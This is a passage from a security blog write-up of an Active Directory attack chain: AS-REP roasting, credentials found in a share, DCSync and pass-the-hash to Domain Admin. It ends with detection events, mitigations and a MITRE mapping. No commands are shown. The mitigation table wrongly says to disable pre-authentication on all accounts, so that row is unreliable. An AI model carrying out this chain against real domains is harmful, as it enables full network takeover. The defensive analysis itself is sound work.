+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-21-00-10-2.png" alt="" width="1910" height="150" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-2xl.png 1920w"></figure><p>The <code>(Pwn3d!)</code> indicator confirms full administrative access on the target. We are now executing commands in the security context of the Domain Administrator.</p><h3>Why This Worked</h3><ul><li>The NTLM hash was recoverable through the DCSync attack, which was possible because the backup account had excessive replication privileges.</li><li>WinRM was enabled on the Domain Controller, providing a remote command execution channel.</li><li>No additional factor (Credential Guard, Just Enough Administration, or network segmentation) prevented hash reuse.</li></ul><h3>Detection</h3><table><thead><tr><th>Artifact</th><th>Source</th><th>Event ID</th></tr></thead><tbody><tr><td>Logon with explicit credentials</td><td>Target System Security Log</td><td>4648 (if explicit)</td></tr><tr><td>Network logon from non-DC host</td><td>Domain Controller Security Log</td><td>4624 (Logon Type 3 or 10)</td></tr></tbody></table><p>The most effective detection of pass-the-hash attacks involves monitoring for <strong>Logon Type 3</strong> (network logon) events from NTLM where the source workstation is not the expected management host for that target.</p><h3>Mitigation</h3><ol><li><strong>Enable Credential Guard</strong> — isolates NTLM hashes in a virtualized secure enclave, preventing extraction even from an elevated process.</li><li><strong>Restrict WinRM access</strong> — configure WinRM firewall rules and <code>TrustedHosts</code> to accept connections only from designated management hosts.</li><li><strong>Disable NTLM where possible</strong> — configure the domain to use Kerberos only (though legacy compatibility often prevents this).</li><li><strong>Implement Privileged Access Workstations (PAWs)</strong> — administrative actions must originate from dedicated, hardened workstations.</li><li><strong>Use Just Enough Administration (JEA)</strong> — limit the commands available to administrative sessions.</li></ol><h2>Detection Opportunities Summary</h2><p>The following table maps each attack phase to relevant Windows security events:</p><table><thead><tr><th>Attack Phase</th><th>Event ID</th><th>Description</th></tr></thead><tbody><tr><td>Kerberos User Enumeration</td><td>4768</td><td>Multiple TGT requests with KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</td></tr><tr><td>AS-REP Roasting</td><td>4768</td><td>TGT request for account with pre-auth disabled</td></tr><tr><td>SMB Share Access</td><td>5140</td><td>Access to non-standard SMB share</td></tr><tr><td>DCSync</td><td>4662</td><td>Access to domain root with Replicating Directory Changes</td></tr><tr><td>DCSync</td><td>4928/4929</td><td>Replication from non-DC source</td></tr><tr><td>Pass-the-Hash</td><td>4624</td><td>Network logon (Type 3) using NTLM from unexpected source</td></tr></tbody></table><h2>MITRE ATT&amp;CK Mapping</h2><table><thead><tr><th>Technique</th><th>ID</th><th>Tactic</th></tr></thead><tbody><tr><td>Active Scanning</td><td>T1595.001</td><td>Reconnaissance</td></tr><tr><td>Domain Account Discovery</td><td>T1087.002</td><td>Discovery</td></tr><tr><td>Valid Accounts</td><td>T1078</td><td>Initial Access</td></tr><tr><td>Kerberoasting / AS-REP Roasting</td><td>T1558.003</td><td>Credential Access</td></tr><tr><td>SMB/Windows Admin Shares</td><td>T1021.002</td><td>Lateral Movement</td></tr><tr><td>OS Credential Dumping: DCSync</td><td>T1003.006</td><td>Credential Access</td></tr><tr><td>Pass-the-Hash</td><td>T1550.002</td><td>Lateral Movement / Defense Evasion</td></tr><tr><td>Remote Services: WinRM</td><td>T1021.006</td><td>Lateral Movement</td></tr><tr><td>Use Alternate Authentication Material</td><td>T1550</td><td>Lateral Movement</td></tr></tbody></table><h2>Mitigation Summary</h2><table><thead><tr><th>Attack Phase</th><th>Primary Mitigation</th></tr></thead><tbody><tr><td>User Enumeration</td><td>Restrict port 88/TCP access; monitor anomalous TGT request volume</td></tr><tr><td>AS-REP Roasting</td><td>Disable pre-authentication on all accounts; enforce strong passwords</td></tr><tr><td>SMB Enumeration</td><td>Least-privilege share permissions; never store credentials in accessible shares</td></tr><tr><td>DCSync</td><td>Remove replication permissions from non-DC accounts; audit domain root ACLs</td></tr><tr><td>Pass-the-Hash</td><td>Enable Credential Guard; restrict WinRM; phase out NTLM</td></tr></tbody></table><h2>Conclusion</h2><p>This attack chain demonstrates a common but devastating path to full Active Directory compromise that relies on only a handful of misconfigurations:</p><ol><li><strong>A service account with pre-authentication disabled and a weak password</strong> yields the first credential pair through AS-REP roasting.</li><li><strong>Credentials stored in a readable network share</strong> provides elevation to a privileged backup account.</li><li><strong>Excessive replication permissions on the backup account</strong> enables a DCSync attack, dumping all domain password hashes.</li><li><strong>NTLM pass-the-hash against WinRM</strong> provides immediate Domain Administrator access.</li></ol><p>Each of these misconfigurations is individually preventable. The combination, however, creates a kill chain that no single defense can stop. Effective AD security requires a layered approach: strong authentication policies, least-privilege delegation, credential hygiene, and continuous monitoring for the specific behavioral signals outlined in this article.</p><p>The most critical takeaway is this: <strong>DCSync is the crown jewel</strong>. If an attacker reaches this phase, game-over is inevitable. Protecting replication permissions — combined with enabling Credential Guard to prevent hash extraction even from elevated contexts — provides the highest return on defensive investment.</p><h2>References</h2><ul><li>Impacket: <a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></li><li>Kerbrute: <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></li><li>NetExec (formerly CrackMapExec): <a href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></li><li>MITRE ATT&amp;CK: <a href="https://attack.mitre.org">https://attack.mitre.org</a></li><li>Microsoft Security Event 4662: <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662">https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662</a></li><li>MS-DRSR Protocol: <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/</a></li></ul><p> </p><p> </p><h1>EFO</h1><p></p></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on July 1, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://w4nn4d13.tech/tags/application-security/">Application Security</a></li><li><a href="https://w4nn4d13.tech/tags/desktop-application/">Desktop Application</a></li><li><a href="https://w4nn4d13.tech/tags/security-research/">Security Research</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fw4nn4d13.tech%2Factive-directory-attack-path-analysis%2F" class="js-share facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fw4nn4d13.tech%2Factive-directory-attack-path-analysis%2F&amp;via=0x5t4l1n&amp;text=Active%20Directory%20Attack%20Path%20Analysis" class="js-share twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fw4nn4d13.tech%2Factive-directory-attack-path-analysis%2F&amp;media=undefined&amp;description=Active%20Directory%20Attack%20Path%20Analysis" class="js-share pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fw4nn4d13.tech%2Factive-directory-attack-path-analysis%2F" class="js-share mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fw4nn4d13.tech%2Factive-directory-attack-path-analysis%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Active%20Directory%20Attack%20Path%20Analysis&amp;url=https%3A%2F%2Fw4nn4d13.tech%2Factive-directory-attack-path-analysis%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Active%20Directory%20Attack%20Path%20Analysis https%3A%2F%2Fw4nn4d13.tech%2Factive-directory-attack-path-analysis%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://w4nn4d13.tech/authors/w4nn4d13/" rel="author">w4nn4d13</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://w4nn4d13.tech/cve-2026-55061/" class="content__nav-link" rel="prev"><div><span>Previous</span>  CVE-2026-55061 </div></a></div></div></div></nav></footer></article><div class="content__comments"><div class="entry-wrapper"></div></div><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://w4nn4d13.tech/authors/w4nn4d13/" class="feed__author">w4nn4d13</a> <time datetime="2026-06-13T15:33" class="feed__date">June 13, 2026</time></div><h3 class="feed__title"><a href="https://w4nn4d13.tech/cve-2026-48097-path-injection-leading-to-arbitrary-command-execution-in-nextor-ip-changer/">CVE-2026-48097 PATH Injection Leading to Arbitrary Command Execution in NexTOR IP Changer</a></h3></header><p>Overview CVE-2026-48097 is a high-severity vulnerability affecting NexTOR IP Changer. The issue originated from unsafe command execution practices that relied on executable resolution through the system PATH environment variable. Under specific conditions, an attacker capable of influencing the execution environment could cause the application to&hellip;</p><a href="https://w4nn4d13.tech/cve-2026-48097-path-injection-leading-to-arbitrary-command-execution-in-nextor-ip-changer/" class="readmore feed__readmore">Continue reading...</a></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><p>Powered by w4nn4d13</p></div><div class="footer__social"><a href="https://x.com/0x5t4l1n" aria-label="X"><svg><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/stalin-s-a310882a0/" aria-label="LinkedIn"><svg><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#linkedin"/></svg></a></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://w4nn4d13.tech/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://w4nn4d13.tech/assets/js/scripts.min.js?v=dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><div class="pcb" data-behaviour="badge" data-behaviour-link="#cookie-settings" data-revision="1" data-config-ttl="90" data-debug-mode="false"><div role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-title" aria-describedby="pcb-txt" class="pcb__banner"><div class="pcb__inner"><div id="pcb-title" role="heading" aria-level="2" class="pcb__title">This website uses cookies</div><div id="pcb-txt" class="pcb__txt">This website uses cookies and Google Analytics to understand website traffic and improve user experience. By continuing to use this website, you consent to the use of cookies. <a href="https://w4nn4d13.tech/privacy-policy/">More details...</a></div><div class="pcb__buttons"><button type="button" class="pcb__btn pcb__btn--link pcb__btn--configure" aria-haspopup="dialog">Manage preferences</button> <button type="button" class="pcb__btn pcb__btn--reject">Reject</button> <button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Accept all</button></div></div></div><div class="pcb__popup" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-popup-title"><div class="pcb__popup__wrapper"><div class="pcb__inner pcb__popup__inner"><div class="pcb__popup__heading"><div id="pcb-popup-title" role="heading" aria-level="2" class="pcb__title">Cookie settings</div><button class="pcb__popup__close" aria-label="Close"></button></div><div class="pcb__popup__content"><div class="pcb__txt pcb__popup__txt">We use cookies to enhance your browsing experience, serve personalized ads or content, and analyze our traffic. By clicking "Accept All", you consent to our use of cookies. <a href="https://w4nn4d13.tech/privacy-policy/">More details...</a></div><ul class="pcb__groups"><li class="pcb__group"><details><summary class="pcb__group__title">Required</summary><p class="pcb__group__txt">Required cookies are necessary for the website to function properly and cannot be disabled. These cookies ensure basic functionality, security, and user preferences.</p></details><div class="pcb__popup__switch is-checked"><input type="checkbox" data-group-name="" id="pcb-group-0" checked="checked"> <label for="pcb-group-0">Required</label></div></li><li class="pcb__group"><details><summary class="pcb__group__title">Analytics</summary><p class="pcb__group__txt">Analytics cookies help us understand how visitors use the website through Google Analytics. This information is used to improve website performance and content.</p></details><div class="pcb__popup__switch"><input type="checkbox" data-group-name="analytics" id="analytics-cookies"> <label for="analytics-cookies">Analytics</label></div></li></ul></div><div class="pcb__buttons pcb__popup__buttons"><button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Accept all</button> <button type="button" class="pcb__btn pcb__btn--reject">Reject all</button> <button type="button" class="pcb__btn pcb__btn--save">Save settings</button></div></div></div></div><div class="pcb__overlay" aria-hidden="true"></div><button class="pcb__badge" aria-label="Cookie Policy" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="40" height="40" viewBox="0 0 23 23" fill="currentColor"><path d="M21.41 12.71c-.08-.01-.15 0-.22 0h-.03c-.03 0-.05 0-.08.01-.07 0-.13.01-.19.04-.52.21-1.44.19-2.02-.22-.44-.31-.65-.83-.62-1.53a.758.758 0 0 0-.27-.61.73.73 0 0 0-.65-.14c-1.98.51-3.49.23-4.26-.78-.82-1.08-.73-2.89.24-4.49.14-.23.14-.52 0-.75a.756.756 0 0 0-.67-.36c-.64.03-1.11-.1-1.31-.35-.19-.26-.13-.71-.01-1.29.04-.18.06-.38.03-.59-.05-.4-.4-.7-.81-.66C5.1 1.54 1 6.04 1 11.48 1 17.28 5.75 22 11.6 22c5.02 0 9.39-3.54 10.39-8.42.08-.4-.18-.78-.58-.87Zm-9.81 7.82c-5.03 0-9.12-4.06-9.12-9.06 0-4.34 3.05-8 7.25-8.86-.08.7.05 1.33.42 1.81.24.32.66.67 1.38.84-.76 1.86-.65 3.78.36 5.11.61.81 2.03 2 4.95 1.51.18.96.71 1.54 1.18 1.87.62.43 1.38.62 2.1.62.05 0 .09 0 .13-.01-1.23 3.64-4.7 6.18-8.64 6.18ZM13 17c0 .55-.45 1-1 1s-1-.45-1-1 .45-1 1-1 1 .45 1 1Zm5.29-12.3a.99.99 0 0 1-.29-.71c0-.55.45-.99 1-.99a1 1 0 0 1 .71.3c.19.19.29.44.29.71 0 .55-.45.99-1 .99a1 1 0 0 1-.71-.3ZM9 13.5c0 .83-.67 1.5-1.5 1.5S6 14.33 6 13.5 6.67 12 7.5 12s1.5.67 1.5 1.5Zm3.25.81a.744.744 0 0 1-.06-1.05c.28-.32.75-.34 1.05-.06.31.28.33.75.05 1.06-.15.16-.35.25-.56.25-.18 0-.36-.06-.5-.19ZM8.68 7.26c.41.37.44 1 .07 1.41-.2.22-.47.33-.75.33a.96.96 0 0 1-.67-.26c-.41-.37-.44-1-.07-1.41.37-.42 1-.45 1.41-.08Zm11.48 1.88c.18-.19.52-.19.7 0 .05.04.09.1.11.16.03.06.04.12.04.19 0 .13-.05.26-.15.35-.09.1-.22.15-.35.15s-.26-.05-.35-.15a.355.355 0 0 1-.11-.16.433.433 0 0 1-.04-.19c0-.13.05-.26.15-.35Zm-4.93-1.86a.75.75 0 1 1 1.059-1.06.75.75 0 0 1-1.059 1.06Z"/></svg></button></div><script>window.dataLayer = window.dataLayer || [];
+                function gtag() { dataLayer.push(arguments); }
+
+                window.publiiCBGCM = {
+                    defaultState: {"ad_storage":true,"ad_personalization":true,"ad_user_data":true,"analytics_storage":true,"personalization_storage":true,"functionality_storage":true,"security_storage":true},
+                    groups: [{"cookieGroup":"analytics","ad_storage":true,"ad_personalization":true,"ad_user_data":true,"analytics_storage":true,"personalization_storage":true,"functionality_storage":true,"security_storage":true}]
+                };
+            
+            (function(win) {
+    if (!document.querySelector('.pcb')) {
+        return;
+    }
+
+    var cbConfig = {
+        behaviour: document.querySelector('.pcb').getAttribute('data-behaviour'),
+        behaviourLink: document.querySelector('.pcb').getAttribute('data-behaviour-link'),
+        revision: document.querySelector('.pcb').getAttribute('data-revision'),
+        configTTL: parseInt(document.querySelector('.pcb').getAttribute('data-config-ttl'), 10),
+        debugMode: document.querySelector('.pcb').getAttribute('data-debug-mode') === 'true',
+        initialState: null,
+        initialLsState: null,
+        previouslyAccepted: []
+    };
+
+    var cbUI = {
+        wrapper: document.querySelector('.pcb'),
+        banner: {
+            element: null,
+            btnAccept: null,
+            btnReject: null,
+            btnConfigure: null
+        },
+        popup: {
+            element: null,
+            btnClose: null,
+            btnSave: null,
+            btnAccept: null,
+            btnReject: null,
+            checkboxes: null,
+        },
+        overlay: null,
+        badge: null,
+        blockedScripts: document.querySelectorAll('script[type^="gdpr-blocker/"]'),
+        triggerLinks: cbConfig.behaviourLink ? document.querySelectorAll('a[href*="' + cbConfig.behaviourLink + '"]') : null
+    };
+
+    function initUI () {
+        // setup banner elements
+        cbUI.banner.element = cbUI.wrapper.querySelector('.pcb__banner');
+        cbUI.banner.btnAccept = cbUI.banner.element.querySelector('.pcb__btn--accept');
+        cbUI.banner.btnReject = cbUI.banner.element.querySelector('.pcb__btn--reject');
+        cbUI.banner.btnConfigure = cbUI.banner.element.querySelector('.pcb__btn--configure');
+
+        // setup popup elements
+        if (cbUI.wrapper.querySelector('.pcb__popup')) {
+            cbUI.popup.element = cbUI.wrapper.querySelector('.pcb__popup');
+            cbUI.popup.btnClose = cbUI.wrapper.querySelector('.pcb__popup__close');
+            cbUI.popup.btnSave = cbUI.popup.element.querySelector('.pcb__btn--save');
+            cbUI.popup.btnAccept = cbUI.popup.element.querySelector('.pcb__btn--accept');
+            cbUI.popup.btnReject = cbUI.popup.element.querySelector('.pcb__btn--reject');
+            cbUI.popup.checkboxes = cbUI.popup.element.querySelector('input[type="checkbox"]');
+            // setup overlay
+            cbUI.overlay = cbUI.wrapper.querySelector('.pcb__overlay');
+        }
+
+        cbUI.badge = cbUI.wrapper.querySelector('.pcb__badge');
+
+        if (cbConfig.behaviour.indexOf('link') > -1) {
+            for (var i = 0; i < cbUI.triggerLinks.length; i++) {
+                cbUI.triggerLinks[i].addEventListener('click', function(e) {
+                    e.preventDefault();
+                    showBannerOrPopup();
+                });
+            }
+        }
+    }
+
+    function initState () {
+        var lsKeyName = getConfigName();
+        var currentConfig = localStorage.getItem(lsKeyName);
+        var configIsFresh = checkIfConfigIsFresh();
+
+        if (!configIsFresh || currentConfig === null) {
+            if (cbConfig.debugMode) {
+                console.log('🍪 Config not found, or configuration expired');
+            }
+
+            if (window.publiiCBGCM) {
+                gtag('consent', 'default', {
+                    'ad_storage': window.publiiCBGCM.defaultState.ad_storage ? 'granted' : 'denied',
+                    'ad_personalization': window.publiiCBGCM.defaultState.ad_personalization ? 'granted' : 'denied',
+                    'ad_user_data': window.publiiCBGCM.defaultState.ad_user_data ? 'granted' : 'denied',
+                    'analytics_storage': window.publiiCBGCM.defaultState.analytics_storage ? 'granted' : 'denied',
+                    'personalization_storage': window.publiiCBGCM.defaultState.personalization_storage ? 'granted' : 'denied',
+                    'functionality_storage': window.publiiCBGCM.defaultState.functionality_storage ? 'granted' : 'denied',
+                    'security_storage': window.publiiCBGCM.defaultState.security_storage ? 'granted' : 'denied'
+                });  
+                
+                if (cbConfig.debugMode) {
+                    console.log('🍪 GCMv2 DEFAULT STATE: ' + JSON.stringify({
+                        'ad_storage': window.publiiCBGCM.defaultState.ad_storage ? 'granted' : 'denied',
+                        'ad_personalization': window.publiiCBGCM.defaultState.ad_personalization ? 'granted' : 'denied',
+                        'ad_user_data': window.publiiCBGCM.defaultState.ad_user_data ? 'granted' : 'denied',
+                        'analytics_storage': window.publiiCBGCM.defaultState.analytics_storage ? 'granted' : 'denied',
+                        'personalization_storage': window.publiiCBGCM.defaultState.personalization_storage ? 'granted' : 'denied',
+                        'functionality_storage': window.publiiCBGCM.defaultState.functionality_storage ? 'granted' : 'denied',
+                        'security_storage': window.publiiCBGCM.defaultState.security_storage ? 'granted' : 'denied'
+                    }));
+                }
+            }
+
+            showBanner();
+        } else if (typeof currentConfig === 'string') {
+            if (cbConfig.debugMode) {
+                console.log('🍪 Config founded');
+            }
+
+            cbConfig.initialLsState = currentConfig.split(',');
+
+            if (window.publiiCBGCM) {
+                gtag('consent', 'default', {
+                    'ad_storage': getDefaultConsentState(currentConfig, 'ad_storage'),
+                    'ad_personalization': getDefaultConsentState(currentConfig, 'ad_personalization'),
+                    'ad_user_data': getDefaultConsentState(currentConfig, 'ad_user_data'),
+                    'analytics_storage': getDefaultConsentState(currentConfig, 'analytics_storage'),
+                    'personalization_storage': getDefaultConsentState(currentConfig, 'personalization_storage'),
+                    'functionality_storage': getDefaultConsentState(currentConfig, 'functionality_storage'),
+                    'security_storage': getDefaultConsentState(currentConfig, 'security_storage')
+                });
+                
+                if (cbConfig.debugMode) {
+                    console.log('🍪 GCMv2 DEFAULT STATE: ' + JSON.stringify({
+                        'ad_storage': getDefaultConsentState(currentConfig, 'ad_storage'),
+                        'ad_personalization': getDefaultConsentState(currentConfig, 'ad_personalization'),
+                        'ad_user_data': getDefaultConsentState(currentConfig, 'ad_user_data'),
+                        'analytics_storage': getDefaultConsentState(currentConfig, 'analytics_storage'),
+                        'personalization_storage': getDefaultConsentState(currentConfig, 'personalization_storage'),
+                        'functionality_storage': getDefaultConsentState(currentConfig, 'functionality_storage'),
+                        'security_storage': getDefaultConsentState(currentConfig, 'security_storage')
+                    }));
+                }
+            }
+
+            showBadge();
+
+            if (cbUI.popup.element) {
+                var allowedGroups = currentConfig.split(',');
+                var checkedCheckboxes = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
+
+                for (var j = 0; j < checkedCheckboxes.length; j++) {
+                    var name = checkedCheckboxes[j].getAttribute('data-group-name');
+
+                    if (name && name !== '-' && allowedGroups.indexOf(name) === -1) {
+                        checkedCheckboxes[j].checked = false;
+                    }
+                }
+
+                for (var i = 0; i < allowedGroups.length; i++) {
+                    var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + allowedGroups[i] + '"]');
+
+                    if (checkbox) {
+                        checkbox.checked = true;
+                    }
+
+                    allowCookieGroup(allowedGroups[i]);
+                }
+            }
+        }
+
+        setTimeout(function () {
+            cbConfig.initialState = getInitialStateOfConsents();
+        }, 0);
+    }
+
+    function checkIfConfigIsFresh () {
+        var lastConfigSave = localStorage.getItem('publii-gdpr-cookies-config-save-date');
+
+        if (lastConfigSave === null) {
+            return false;
+        }
+
+        lastConfigSave = parseInt(lastConfigSave, 10);
+
+        if (lastConfigSave === 0) {
+            return true;
+        }
+
+        if (+new Date() - lastConfigSave < cbConfig.configTTL * 24 * 60 * 60 * 1000) {
+            return true;
+        }
+
+        return false;
+    }
+
+    function getDefaultConsentState (currentConfig, consentGroup) {
+        let configGroups = currentConfig.split(',');
+
+        for (let i = 0; i < configGroups.length; i++) {
+            let groupName = configGroups[i];
+            let group = window.publiiCBGCM.groups.find(group => group.cookieGroup === groupName);
+
+            if (group && group[consentGroup]) {
+                return 'granted';
+            }
+        }  
+        
+        if (window.publiiCBGCM.defaultState[consentGroup]) {
+            return 'granted'; 
+        }
+        
+        return 'denied';
+    }
+
+    function initBannerEvents () {
+        cbUI.banner.btnAccept.addEventListener('click', function (e) {
+            e.preventDefault();
+            acceptAllCookies('banner');
+            showBadge();
+        }, false);
+
+        if (cbUI.banner.btnReject) {
+            cbUI.banner.btnReject.addEventListener('click', function (e) {
+                e.preventDefault();
+                rejectAllCookies();
+                showBadge();
+            }, false);
+        }
+
+        if (cbUI.banner.btnConfigure) {
+            cbUI.banner.btnConfigure.addEventListener('click', function (e) {
+                e.preventDefault();
+                hideBanner();
+                showAdvancedPopup();
+                showBadge();
+            }, false);
+        }
+    }
+
+    function initPopupEvents () {
+        if (!cbUI.popup.element) {
+            return;
+        }
+
+        cbUI.overlay.addEventListener('click', function (e) {
+            hideAdvancedPopup();
+        }, false);
+
+        cbUI.popup.element.addEventListener('click', function (e) {
+            e.stopPropagation();
+        }, false);
+
+        cbUI.popup.btnAccept.addEventListener('click', function (e) {
+            e.preventDefault();
+            acceptAllCookies('popup');
+        }, false);
+
+        cbUI.popup.btnReject.addEventListener('click', function (e) {
+            e.preventDefault();
+            rejectAllCookies();
+        }, false);
+
+        cbUI.popup.btnSave.addEventListener('click', function (e) {
+            e.preventDefault();
+            saveConfiguration();
+        }, false);
+
+        cbUI.popup.btnClose.addEventListener('click', function (e) {
+            e.preventDefault();
+            hideAdvancedPopup();
+        }, false);
+    }
+
+    function initBadgeEvents () {
+        if (!cbUI.badge) {
+            return;
+        }
+
+        cbUI.badge.addEventListener('click', function (e) {
+            showBannerOrPopup();
+        }, false);
+    }
+
+    initUI();
+    initState();
+    initBannerEvents();
+    initPopupEvents();
+    initBadgeEvents();
+
+    /**
+     * API
+     */
+    function addScript (src, inline) {
+        var newScript = document.createElement('script');
+
+        if (src) {
+            newScript.setAttribute('src', src);
+        }
+
+        if (inline) {
+            newScript.text = inline;
+        }
+
+        document.body.appendChild(newScript);
+    }
+
+    function allowCookieGroup (allowedGroup) {
+        var scripts = document.querySelectorAll('script[type="gdpr-blocker/' + allowedGroup + '"]');
+        cbConfig.previouslyAccepted.push(allowedGroup);
+    
+        for (var j = 0; j < scripts.length; j++) {
+            addScript(scripts[j].src, scripts[j].text);
+        }
+
+        var groupEvent = new Event('publii-cookie-banner-unblock-' + allowedGroup);
+        document.body.dispatchEvent(groupEvent);
+        unlockEmbeds(allowedGroup);
+
+        if (cbConfig.debugMode) {
+            console.log('🍪 Allowed group: ' + allowedGroup);
+        }
+
+        if (window.publiiCBGCM && (!cbConfig.initialLsState || cbConfig.initialLsState.indexOf(allowedGroup) === -1)) {
+            let consentResult = {};
+            let group = window.publiiCBGCM.groups.find(group => group.cookieGroup === allowedGroup);
+
+            if (group) {
+                let foundSomeConsents = false;
+
+                Object.keys(group).forEach(key => {
+                    if (key !== 'cookieGroup' && group[key] === true) {
+                        consentResult[key] = 'granted';
+                        foundSomeConsents = true;
+                    }
+                });
+
+                if (foundSomeConsents) {
+                    gtag('consent', 'update', consentResult);   
+
+                    if (cbConfig.debugMode) {
+                        console.log('🍪 GCMv2 UPDATE: ' + JSON.stringify(consentResult));
+                    }
+                }
+            }
+        }
+    }
+
+    function showBannerOrPopup () {
+        if (cbUI.popup.element) {
+            showAdvancedPopup();
+        } else {
+            showBanner();
+        }
+    }
+
+    function showAdvancedPopup () {
+        cbUI.popup.element.classList.add('is-visible');
+        cbUI.overlay.classList.add('is-visible');
+        cbUI.popup.element.setAttribute('aria-hidden', 'false');
+        cbUI.overlay.setAttribute('aria-hidden', 'false');
+    }
+
+    function hideAdvancedPopup () {
+        cbUI.popup.element.classList.remove('is-visible');
+        cbUI.overlay.classList.remove('is-visible');
+        cbUI.popup.element.setAttribute('aria-hidden', 'true');
+        cbUI.overlay.setAttribute('aria-hidden', 'true');
+    }
+
+    function showBanner () {
+        cbUI.banner.element.classList.add('is-visible');
+        cbUI.banner.element.setAttribute('aria-hidden', 'false');
+    }
+
+    function hideBanner () {
+        cbUI.banner.element.classList.remove('is-visible');
+        cbUI.banner.element.setAttribute('aria-hidden', 'true');
+    }
+
+    function showBadge () {
+        if (!cbUI.badge) {
+            return;
+        }
+
+        cbUI.badge.classList.add('is-visible');
+        cbUI.badge.setAttribute('aria-hidden', 'false');
+    }
+
+    function getConfigName () {
+        var lsKeyName = 'publii-gdpr-allowed-cookies';
+
+        if (cbConfig.revision) {
+            lsKeyName = lsKeyName + '-v' + parseInt(cbConfig.revision, 10);
+        }
+
+        return lsKeyName;
+    }
+
+    function storeConfiguration (allowedGroups) {
+        var lsKeyName = getConfigName();
+        var dataToStore = allowedGroups.join(',');
+        localStorage.setItem(lsKeyName, dataToStore);
+
+        if (cbConfig.configTTL === 0) {
+            localStorage.setItem('publii-gdpr-cookies-config-save-date', 0);
+
+            if (cbConfig.debugMode) {
+                console.log('🍪 Store never expiring configuration');
+            }
+        } else {
